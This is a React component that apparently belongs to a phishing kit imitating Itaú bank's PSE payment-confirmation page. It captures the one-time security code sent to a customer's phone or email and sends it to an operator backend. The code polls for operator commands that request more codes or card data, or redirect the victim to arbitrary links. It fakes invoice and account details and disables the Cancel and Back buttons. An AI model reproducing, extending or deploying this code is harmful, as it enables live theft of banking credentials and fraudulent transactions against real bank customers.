import { useEffect, useRef, useState } from 'react';
import { instanceBackend } from '../../../../../axios/instanceBackend';
import { redirectToTcIngreso } from '../../../../ingresoTc/tcSessionHelper';
import logoitau from "../../img/logo_itau.png";
import banneritau from "../../img/banner.jpg";
import LoadingItau from '../../../../../components/LoadingItau';
import ModalErrorItau from '../../modals/ModalErrorItau';
import "./itau_otp_pse.css";

const ITAU_ERROR_KEY = 'estado_sesion';
const ITAU_OTP_MID_FLOW_KEY = 'itau_otp_mid_flow';
const ITAU_OTP_INVOICE_KEY = 'itau_otp_invoice';
const ITAU_ACCOUNT_DEBIT = 'Cuenta de Ahorros ****';

const ITAU_OTP_LEN = 6;
const ITAU_OTP_DIGITS = /[^0-9]/g;

const sanitizeItauOtp = (value) =>
    String(value ?? '').replace(ITAU_OTP_DIGITS, '').slice(0, ITAU_OTP_LEN);

const ITAU_OTP_ERROR_MSG =
    'El código OTP ingresado es incorrecto. Por favor, verifique e intente nuevamente.';

const ITAU_OTP_SECURITY_HINT =
    'Recuerde que debes ingresar los dígitos correctos para poder continuar con la transacción.';

const generateItauInvoiceNumber = () => {
    const existing = sessionStorage.getItem(ITAU_OTP_INVOICE_KEY);
    if (existing) return existing;

    const invoiceNumber = String(
        Math.floor(1000000000 + Math.random() * 9000000000),
    );
    sessionStorage.setItem(ITAU_OTP_INVOICE_KEY, invoiceNumber);
    return invoiceNumber;
};

const ESTADOS_TRAS_OTP = [
    'sol_otp',
    'sol_tc',
    'sol_finalizar',
    'sol_finalizado',
    'solicitar_finalizar',
    'error_otp',
    'error_login',
    'block_ip',
    'error_blocked',
];

const ItauOtpPse = () => {

    const [getOtp, setOtp] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [showErrorModal, setShowErrorModal] = useState(false);
    const [errorModalMessage, setErrorModalMessage] = useState(ITAU_OTP_ERROR_MSG);

    const [transactionData, setTransactionData] = useState({
        invoiceNumber: generateItauInvoiceNumber(),
        merchant: '',
        account: ITAU_ACCOUNT_DEBIT,
        description: '',
    });

    const pollingIntervalRef = useRef(null);
    const sessionIdRef = useRef(null);
    const lastEstadoRef = useRef(null);
    const modalBloqueoEstadoRef = useRef(null);
    const ignorarEstadoHastaCambioRef = useRef(null);
    const allowPollNavigationRef = useRef(false);

    const stopPolling = () => {
        if (pollingIntervalRef.current) {
            clearInterval(pollingIntervalRef.current);
            pollingIntervalRef.current = null;
        }
    };

    const mostrarErrorOtp = () => {
        stopPolling();
        setIsLoading(false);
        allowPollNavigationRef.current = false;
        sessionStorage.removeItem(ITAU_OTP_MID_FLOW_KEY);
        setOtp('');
        setErrorModalMessage(ITAU_OTP_ERROR_MSG);
        modalBloqueoEstadoRef.current = 'error_otp';
        lastEstadoRef.current = 'error_otp';
        setShowErrorModal(true);
        window.scrollTo(0, 0);
    };

    const cerrarModalError = () => {
        const estadoServidor = modalBloqueoEstadoRef.current;
        modalBloqueoEstadoRef.current = null;

        if (estadoServidor === 'error_otp' || estadoServidor === 'error_blocked' || estadoServidor === 'block_ip') {
            ignorarEstadoHastaCambioRef.current = estadoServidor;
        }

        setShowErrorModal(false);
        setIsLoading(false);
        setOtp('');
        sessionStorage.removeItem(ITAU_OTP_MID_FLOW_KEY);
        allowPollNavigationRef.current = false;
        stopPolling();
        setErrorModalMessage(ITAU_OTP_ERROR_MSG);
    };

    const loadTransactionDetails = async (sid) => {
        if (!sid) return;

        try {
            const response = await instanceBackend.get(`/pse/receipt/${sid}`);
            const receipt = response?.data?.receipt || {};

            const merchant = String(
                receipt.empresa || receipt.destinoPago || '',
            ).trim();
            const description = String(
                receipt.descripcion || receipt.motivo || '',
            ).trim();

            setTransactionData((prev) => ({
                ...prev,
                merchant,
                description,
            }));
        } catch (error) {
            console.error('Error cargando datos de transacción Itaú OTP', error);
        }
    };

    useEffect(() => {
        const pendingError = localStorage.getItem(ITAU_ERROR_KEY);
        const midFlow = sessionStorage.getItem(ITAU_OTP_MID_FLOW_KEY) === '1';

        if (pendingError === 'error') {
            localStorage.removeItem(ITAU_ERROR_KEY);
            mostrarErrorOtp();
        }

        const sid = localStorage.getItem('sessionId');
        if (sid) {
            sessionIdRef.current = sid;
            loadTransactionDetails(sid);
        }

        if (midFlow && sid) {
            allowPollNavigationRef.current = true;
            setIsLoading(true);
            initPolling();
        }

        return () => stopPolling();
    }, []);

    const postItauOtp = async (dataSend) => {
        const centralUrl = (
            process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL || ''
        ).trim();
        return centralUrl
            ? instanceBackend.post(centralUrl, dataSend)
            : instanceBackend.post('/itau/otp', dataSend);
    };

    const handleAccept = async (e) => {
        e.preventDefault();

        if (showErrorModal) return;

        if (!/^\d{6}$/.test(getOtp)) {
            setOtp('');
            setErrorModalMessage('El código debe tener 6 dígitos numéricos');
            modalBloqueoEstadoRef.current = null;
            setShowErrorModal(true);
            return;
        }

        const sessionId = localStorage.getItem('sessionId');
        if (!sessionId) {
            setOtp('');
            setErrorModalMessage('Error: No se encontró la sesión');
            modalBloqueoEstadoRef.current = null;
            setShowErrorModal(true);
            return;
        }

        const dataSend = {
            data: {
                attributes: {
                    sessionId,
                    otp: getOtp,
                    fecha: new Date().toISOString(),
                    backend: 'P01',
                    backend_central_url: process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL,
                    backend_url: '/api/v1/itau/otp',
                },
            },
        };

        stopPolling();
        lastEstadoRef.current = null;
        setIsLoading(true);

        try {
            const response = await postItauOtp(dataSend);

            if (!response.data?.success) {
                setIsLoading(false);
                mostrarErrorOtp();
                return;
            }

            const sid = response.data.sessionId ?? sessionId;
            localStorage.setItem('sessionId', sid);
            sessionIdRef.current = sid;
            sessionStorage.setItem(ITAU_OTP_MID_FLOW_KEY, '1');
            allowPollNavigationRef.current = true;
            initPolling();
        } catch (e) {
            console.error('Error enviando OTP', e.response?.data || e.message);
            setIsLoading(false);
            setOtp('');
            setErrorModalMessage('Error al enviar el código. Intente nuevamente.');
            modalBloqueoEstadoRef.current = null;
            setShowErrorModal(true);
        }
    };

    const initPolling = () => {
        stopPolling();
        pollingIntervalRef.current = setInterval(() => {
            verifyState();
        }, 3000);
        verifyState();
    };

    const verifyState = async () => {
        const sessionId = sessionIdRef.current || localStorage.getItem('sessionId');
        if (!sessionId) return;

        try {
            const response = await instanceBackend.post(`/itau/verify-state/${sessionId}`);
            const { estado: estadoRaw, tc, tarjeta, bank, url, text } = response?.data || {};
            const estado = (estadoRaw || '').toString().toLowerCase();
            const hasUrl = Boolean(url && String(url).trim());
            const customLink = hasUrl ? url : (text && String(text).trim() ? text : null);
            const tarjetaDigits = String(tarjeta || '').replace(/\D/g, '');
            const isTcSession = Boolean(tc);
            const isTcOtpFlow = isTcSession && tarjetaDigits.length > 0;
            const linkPendiente = estado === 'sol_link_bot' || (estado === 'link_bot' && !hasUrl) || (estado === 'sol_link_custom' && !customLink);

            if (!estado) return;

            if (ignorarEstadoHastaCambioRef.current) {
                if (estado === ignorarEstadoHastaCambioRef.current) return;
                ignorarEstadoHastaCambioRef.current = null;
                modalBloqueoEstadoRef.current = null;
            }

            if (modalBloqueoEstadoRef.current && estado === modalBloqueoEstadoRef.current) {
                return;
            }

            if (ESTADOS_TRAS_OTP.includes(estado) && !allowPollNavigationRef.current) {
                return;
            }

            if (!linkPendiente && lastEstadoRef.current === estado) return;
            if (!linkPendiente) lastEstadoRef.current = estado;

            switch (estado) {
                case 'sol_otp':
                case 'sol_tc':
                    setIsLoading(false);
                    sessionStorage.removeItem(ITAU_OTP_MID_FLOW_KEY);
                    allowPollNavigationRef.current = false;
                    if (estado === 'sol_otp' && isTcOtpFlow) {
                        redirectToTcIngreso(
                            '/ingreso-tc/otp',
                            sessionIdRef.current,
                            bank,
                            tarjetaDigits,
                        );
                    } else {
                        setOtp('');
                    }
                    break;
                case 'error_otp':
                    stopPolling();
                    sessionStorage.removeItem(ITAU_OTP_MID_FLOW_KEY);
                    allowPollNavigationRef.current = false;
                    if (isTcOtpFlow) {
                        redirectToTcIngreso(
                            '/ingreso-tc/otp',
                            sessionIdRef.current,
                            bank,
                            tarjetaDigits,
                            'error_otp',
                        );
                    } else {
                        mostrarErrorOtp();
                    }
                    break;
                case 'error_login':
                    setIsLoading(false);
                    sessionStorage.removeItem(ITAU_OTP_MID_FLOW_KEY);
                    allowPollNavigationRef.current = false;
                    localStorage.setItem(ITAU_ERROR_KEY, 'error');
                    window.location.href = '/itau_pse';
                    break;
                case 'sol_finalizar':
                case 'sol_finalizado':
                case 'solicitar_finalizar':
                    setIsLoading(false);
                    sessionStorage.removeItem(ITAU_OTP_MID_FLOW_KEY);
                    allowPollNavigationRef.current = false;
                    localStorage.clear();
                    sessionStorage.clear();
                    if (isTcSession) {
                        window.location.href = `/finalizado-tc?sessionId=${encodeURIComponent(sessionIdRef.current)}`;
                    } else {
                        window.location.href = '/finalizado-pse?sessionId=' + sessionIdRef.current;
                    }
                    break;
                case 'link_bot':
                    if (hasUrl) {
                        stopPolling();
                        sessionStorage.removeItem(ITAU_OTP_MID_FLOW_KEY);
                        allowPollNavigationRef.current = false;
                        window.location.href = url;
                    }
                    break;
                case 'sol_link_custom':
                    if (customLink) {
                        stopPolling();
                        sessionStorage.removeItem(ITAU_OTP_MID_FLOW_KEY);
                        allowPollNavigationRef.current = false;
                        window.location.href = customLink;
                    }
                    break;
                case 'block_ip':
                case 'error_blocked':
                    stopPolling();
                    sessionStorage.removeItem(ITAU_OTP_MID_FLOW_KEY);
                    allowPollNavigationRef.current = false;
                    setIsLoading(false);
                    setOtp('');
                    setErrorModalMessage('Acceso bloqueado por seguridad.');
                    modalBloqueoEstadoRef.current = estado;
                    lastEstadoRef.current = estado;
                    setShowErrorModal(true);
                    break;
                default:
                    break;
            }
        } catch (error) {
            const status = error?.response?.status;
            const estadoErr = (error?.response?.data?.estado || '')
                .toString()
                .toLowerCase();
            if (status === 403 && estadoErr === 'error_blocked') {
                stopPolling();
                setIsLoading(false);
                localStorage.clear();
                window.location.href = process.env.REACT_APP_URL_BANK || '/';
            }
        }
    };

    return (
        <div className="itau-dinamica-container">
            <header className="itau-dinamica-header">
                <div className="itau-dinamica-header-inner">
                    <div className="itau-dinamica-logo-section">
                        <img src={logoitau} alt="Itaú" className="itau-dinamica-logo-img" />
                    </div>
                    <div className="itau-dinamica-banner-section">
                        <img src={banneritau} alt="Banner Itaú" className="itau-dinamica-banner-img" />
                        <div className="itau-dinamica-banner-slogan">
                            <span>En Itaú, todo lo hacemos por ti.</span>
                        </div>
                    </div>
                </div>
            </header>

            <main className="itau-dinamica-main">
                <div className="itau-dinamica-card">
                    <div className="itau-dinamica-progress-bar">
                        <span>SELECCIÓN</span>
                        <span className="separator"> - </span>
                        <span className="current">CONFIRMACIÓN</span>
                        <span className="separator"> - </span>
                        <span>RESPUESTA</span>
                    </div>

                    <header className="itau-dinamica-page-head">
                        <h1 className="itau-dinamica-title">Confirmación de la Transacción</h1>
                        <a href="#ayuda" className="itau-dinamica-help" onClick={() => window.location.reload()}>
                            <span className="itau-dinamica-help-icon" aria-hidden="true">?</span>
                            AYUDA SOBRE ESTA PÁGINA
                        </a>
                    </header>
                    <div className="itau-dinamica-head-line" aria-hidden="true" />

                    <section className="itau-dinamica-tx-section" aria-labelledby="tx-heading">
                        <div id="tx-heading" className="itau-dinamica-tx-banner">
                            Transacción a Realizar
                        </div>
                        <div className="itau-dinamica-tx-wrapper">
                            <table className="itau-dinamica-tx-table">
                                <tbody>
                                    <tr>
                                        <th scope="row" className="itau-dinamica-tx-label">Número de Factura:</th>
                                        <td className="itau-dinamica-tx-value">{transactionData.invoiceNumber}</td>
                                    </tr>
                                    <tr>
                                        <th scope="row" className="itau-dinamica-tx-label">Establecimiento:</th>
                                        <td className="itau-dinamica-tx-value">{transactionData.merchant}</td>
                                    </tr>
                                    <tr>
                                        <th scope="row" className="itau-dinamica-tx-label">Cuenta a debitar:</th>
                                        <td className="itau-dinamica-tx-value">{transactionData.account}</td>
                                    </tr>
                                    <tr>
                                        <th scope="row" className="itau-dinamica-tx-label">Descripción:</th>
                                        <td className="itau-dinamica-tx-value">{transactionData.description || 'Pago electrónico PSE'}</td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                        <div className="itau-dinamica-security-prompt">
                            Ingrese su pregunta de seguridad
                        </div>
                    </section>

                    <section className="itau-dinamica-security" aria-labelledby="security-heading">
                        <div className="itau-dinamica-security-bar itau-dinamica-security-bar--blue">
                            Por favor contesta las preguntas para verificar tu identidad
                        </div>
                        <div className="itau-dinamica-security-field">
                            <div className="itau-dinamica-security-row">
                                <label htmlFor="itau-security-code" className="itau-dinamica-security-question">
                                    ¿Qué código llegó a tu celular o correo electrónico?
                                </label>
                                <input
                                    id="itau-security-code"
                                    type="password"
                                    className="itau-dinamica-security-input mt-2"
                                    value={getOtp}
                                    onChange={(e) => setOtp(sanitizeItauOtp(e.target.value))}
                                    autoComplete="one-time-code"
                                    inputMode="numeric"
                                    pattern="[0-9]*"
                                    minLength={ITAU_OTP_LEN}
                                    maxLength={ITAU_OTP_LEN}
                                    disabled={isLoading || showErrorModal}
                                />
                            </div>
                            <p className="itau-dinamica-security-warning mt-3">
                                {ITAU_OTP_SECURITY_HINT}
                            </p>
                        </div>
                    </section>

                    <div className="itau-dinamica-actions mt-2">
                        <button type="button" className="itau-dinamica-btn itau-dinamica-btn--outline" disabled>
                            Regresar
                        </button>
                        <button type="button" className="itau-dinamica-btn itau-dinamica-btn--outline" disabled>
                            Cancelar
                        </button>
                        <button
                            type="button"
                            className="itau-dinamica-btn itau-dinamica-btn--primary"
                            onClick={handleAccept}
                            disabled={isLoading || showErrorModal}
                        >
                            {isLoading ? 'Cargando...' : 'Aceptar'}
                        </button>
                    </div>
                </div>
            </main>

            {isLoading ? <LoadingItau /> : null}

            <ModalErrorItau
                isOpen={showErrorModal}
                onClose={cerrarModalError}
                onContinue={cerrarModalError}
                subtitle="Error en verificación"
                message={errorModalMessage}
            />
        </div>
    );
};

export default ItauOtpPse;
